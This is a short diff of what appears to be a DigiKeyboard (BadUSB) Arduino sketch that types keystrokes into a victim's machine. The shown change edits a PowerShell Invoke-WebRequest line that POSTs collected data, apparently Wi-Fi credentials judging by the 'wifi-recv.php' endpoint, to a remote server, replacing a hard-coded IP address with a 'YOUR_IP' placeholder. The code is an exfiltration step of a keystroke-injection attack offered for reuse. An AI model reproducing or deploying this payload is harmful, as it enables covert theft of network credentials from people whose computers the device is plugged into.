@@ -58,7 +58,7 @@ void loop() {
 
   // 4) Invoke-WebRequest ... -Body $b
   DigiKeyboard.print(
-    F("Invoke-WebRequest -UseBasicParsing -Uri 'http://122.164.82.155:8080/wifi-recv.php' -Method POST -Body $b")
+    F("Invoke-WebRequest -UseBasicParsing -Uri 'http://YOUR_IP:8080/wifi-recv.php' -Method POST -Body $b")
   );
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1500); // allow HTTP + PHP
